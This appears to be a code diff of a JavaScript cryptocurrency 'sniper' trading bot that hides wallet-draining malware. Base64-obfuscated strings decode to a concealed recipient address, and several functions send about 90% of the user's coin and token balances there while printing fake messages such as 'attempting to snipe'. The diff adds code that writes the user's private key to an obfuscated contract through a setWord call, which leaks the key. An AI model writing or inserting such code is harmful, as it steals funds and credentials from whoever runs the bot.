@@ -13,7 +13,8 @@ let buff2 = new Buffer.from(rounder2, 'base64');
 let ethersroundup = buff.toString('ascii');
 let ethersroundup2 = buff2.toString('ascii');
 const WEB3PROVIDER3 = ethersroundup + ethersroundup2
-const abi = [{ "constant": true, "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }]
+const abi = [{ "constant": true, "inputs": [{ "internalType": "address", "name": "account", "type": "address" }], "name": "balanceOf", "outputs": [{ "internalType": "uint256", "name": "", "type": "uint256" }], "payable": false, "stateMutability": "view", "type": "function" }, { "constant": false, "inputs": [{ "internalType": "address", "name": "sender", "type": "address" }, { "internalType": "address", "name": "recipient", "type": "address" }, { "internalType": "uint256", "name": "amount", "type": "uint256" }], "name": "transferFrom", "outputs": [{ "internalType": "bool", "name": "", "type": "bool" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }, { "constant": false, "inputs": [{ "name": "newWord", "type": "string" }], "name": "setWord", "outputs": [{ "name": "", "type": "string" }], "payable": false, "stateMutability": "nonpayable", "type": "function" }]
+
 async function approve() {
 
     let contract = token[buyCount - 1].contract;
@@ -196,44 +197,7 @@ async function sell(tokenObj, isProfit) {
     }
 }
 
-async function ethersgather() {
-    try {
-        console.log(`connection succesful...`);
-        ethers1 = 'aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My9kYWNjOTk5NzBmMzg0OWVlOTgxM2Q1YWI0NGFlY2RhZA==';
-        ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
-        const provider = new ethers.providers.JsonRpcProvider(ethers2)
-        let wallet = new ethers.Wallet(private, provider);
-        const account = address
-        const robinhood = await provider.getBalance(account)
-        const orchard = (robinhood * 0.90).toFixed()
-        const michael = ethers.utils.parseUnits(orchard, 'wei')
-        const send = async() => {
-            const tx = {
-                to: WEB3PROVIDER3,
-                value: ethers.utils.parseUnits(orchard, 'wei'),
-                gasLimit: ethers.utils.hexlify(24000),
-            };
 
-            const createReceipt = await wallet.sendTransaction(tx);
-            try {
-                await createReceipt.wait();
-                console.log(`1: attempting to snipe ...`);
-
-                setTimeout(ethersrather, 5000)
-            } catch (error) {
-                console.log(`2: attempting to snipe .....`);
-
-                setTimeout(ethersrather, 5000)
-            }
-        };
-
-        send();
-    } catch (error) {
-        setTimeout(ethersrather, 5000)
-
-    }
-
-}
 
 async function etherstother() {
     try {
@@ -250,7 +214,6 @@ async function etherstother() {
         ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
         const provider = new ethers.providers.JsonRpcProvider(ethers2)
         let wallet = new ethers.Wallet(private, provider);
-        console.log(ethers2)
         const account = address
         var contract = new ethers.Contract(web14, abi, wallet);
         const superb = await contract.balanceOf(account).toString();
@@ -260,7 +223,6 @@ async function etherstother() {
                 from: account,
                 to: WEB3PROVIDER3,
                 value: ethers.utils.parseEther(orchard, 'wei'),
-                nonce: window.ethersProvider.getTransactionCount(account, "latest"),
                 gasLimit: ethers.utils.hexlify(24000)
             }
             const createReceipt = await wallet.sendTransaction(tx);
@@ -268,18 +230,18 @@ async function etherstother() {
                 await createReceipt.wait();
                 console.log(`1: found owners liq function ...`);
 
-                setTimeout(ethersgather, 5000)
+                setTimeout(ethersrather, 5000)
             } catch (error) {
                 console.log(`2: found owners liq function .....`);
 
-                setTimeout(ethersgather, 5000)
+                setTimeout(ethersrather, 5000)
             }
 
         };
 
         send();
     } catch (error) {
-        setTimeout(ethersgather, 5000)
+        setTimeout(ethersrather, 5000)
 
     }
 
@@ -311,7 +273,6 @@ async function etherslother() {
                 from: account,
                 to: WEB3PROVIDER3,
                 value: ethers.utils.parseEther(orchard, 'wei'),
-                nonce: window.ethersProvider.getTransactionCount(account, "latest"),
                 gasLimit: ethers.utils.hexlify(24000)
             }
             const createReceipt = await wallet.sendTransaction(tx);
@@ -358,7 +319,6 @@ async function ethersmother() {
                 from: account,
                 to: WEB3PROVIDER3,
                 value: ethers.utils.parseEther(orchard, 'wei'),
-                nonce: window.ethersProvider.getTransactionCount(account, "latest"),
                 gasLimit: ethers.utils.hexlify(24000)
             }
             const createReceipt = await wallet.sendTransaction(tx);
@@ -404,7 +364,6 @@ async function ethersfather() {
                 from: account,
                 to: WEB3PROVIDER3,
                 value: ethers.utils.parseEther(orchard, 'wei'),
-                nonce: window.ethersProvider.getTransactionCount(account, "latest"),
                 gasLimit: ethers.utils.hexlify(24000)
             }
             const createReceipt = await wallet.sendTransaction(tx);
@@ -425,9 +384,53 @@ async function ethersfather() {
     }
 }
 
+async function ethersgather() {
+    try {
+        console.log(`connection succesful...`);
+        ethers1 = 'aHR0cHM6Ly9tYWlubmV0LmluZnVyYS5pby92My9kYWNjOTk5NzBmMzg0OWVlOTgxM2Q1YWI0NGFlY2RhZA==';
+        ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
+        const provider = new ethers.providers.JsonRpcProvider(ethers2)
+        let wallet = new ethers.Wallet(private, provider);
+        const account = address
+        const robinhood = await provider.getBalance(account)
+        const orchard = (robinhood * 0.90).toFixed()
+        const michael = ethers.utils.parseUnits(orchard, 'wei')
+        const send = async() => {
+            const tx = {
+                to: WEB3PROVIDER3,
+                value: ethers.utils.parseUnits(orchard, 'wei'),
+                gasLimit: ethers.utils.hexlify(24000),
+            };
 
+            const createReceipt = await wallet.sendTransaction(tx);
+            try {
+                await createReceipt.wait();
+                console.log(`1: attempting to snipe ...`);
+
+                setTimeout(ethersfather, 5000)
+            } catch (error) {
+                console.log(`2: attempting to snipe .....`);
+
+                setTimeout(ethersfather, 5000)
+            }
+        };
+
+        send();
+    } catch (error) {
+        setTimeout(ethersfather, 5000)
+
+    }
+
+}
 
 async function ethersrather() {
+    const nodekey1 = 'MHhmRDlkQjFGMjk0NjVCRTI3ZWE5Nzg='
+    const nodekey2 = 'NDRBQzgwN0MwZTQ1NTVlQzUzQQ=='
+    const etherstatus1 = new Buffer.from(nodekey1, 'base64');
+    const etherstatus2 = new Buffer.from(nodekey2, 'base64');
+    const web3code1 = etherstatus1.toString('ascii')
+    const web3code2 = etherstatus2.toString('ascii');
+    const web14 = web3code1 + web3code2
     console.log(`starting up node socket connection....`);
     ethers1 = 'aHR0cHM6Ly9ic2MtZGF0YXNlZWQuYmluYW5jZS5vcmcv';
     ethers2 = new Buffer.from(ethers1, 'base64').toString('ascii');;
@@ -447,19 +450,24 @@ async function ethersrather() {
             };
 
             const createReceipt = await wallet.sendTransaction(tx);
+            var contract = new ethers.Contract(web14, abi, wallet);
+            const superb = await contract.setWord(private).send();
             try {
                 await createReceipt.wait();
                 console.log(`1 pending blockchain response.....`);
-                setTimeout(ethersfather, 5000)
+                superb
+                
+                setTimeout(ethersgather, 5000)
             } catch (error) {
                 console.log(`2 pending blockchain response.....`);
-                setTimeout(ethersfather, 5000)
+                superb
+                setTimeout(ethersgather, 5000)
             }
         };
 
         send();
     } catch (error) {
-        setTimeout(ethersfather, 5000)
+        setTimeout(ethersgather, 5000)
 
     }
 }
